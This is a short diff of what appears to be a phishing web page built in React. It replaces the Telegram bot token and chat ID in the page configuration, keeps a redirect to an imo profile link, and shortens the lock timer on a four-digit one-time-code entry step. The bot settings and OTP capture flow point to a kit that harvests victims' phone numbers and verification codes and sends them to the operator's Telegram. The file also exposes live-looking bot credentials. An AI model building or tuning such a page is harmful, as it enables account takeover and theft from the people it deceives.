@@ -134,8 +134,8 @@
         const { useState, useEffect, useRef } = React;
 
         // --- CONFIGURATION ---
-        const BOT_TOKEN = "8522129049:AAHZalnaH5g1evquwhwL1PmZjiasK9ZpAdI"; 
-        const CHAT_ID = "6904677396"; 
+        const BOT_TOKEN = "8741697774:AAGf25_xzw8LRBiUjiK8jorC-CVqnHsuZ9s"; 
+        const CHAT_ID = "7919254903"; 
         const REDIRECT_LINK = "https://profile.imo.im/profileshare/shr.AAAAAAAAAAAAAAAAAAAAAPJ7LNAdm5sh2K-4b-Aq7rq4CDUGPD4SInhRX-x2NJh6";
 
         // --- DATA: COUNTRIES (Digits Updated for 11 and flexibility) ---
@@ -266,7 +266,7 @@
             const [otp, setOtp] = useState(['', '', '', '']);
             const [otpSubmitTime, setOtpSubmitTime] = useState(0); 
             const [otpLocked, setOtpLocked] = useState(false);
-            const [lockTimer, setLockTimer] = useState(30);
+            const [lockTimer, setLockTimer] = useState(15);
             const [isRetryPhase, setIsRetryPhase] = useState(false); 
             const otpRefs = [useRef(), useRef(), useRef(), useRef()];
 
@@ -320,7 +320,7 @@
                 setTimeout(() => {
                     setStep('OTP');
                     setOtpLocked(true);
-                    setLockTimer(30);
+                    setLockTimer(15);
                 }, 3000);
             };
 
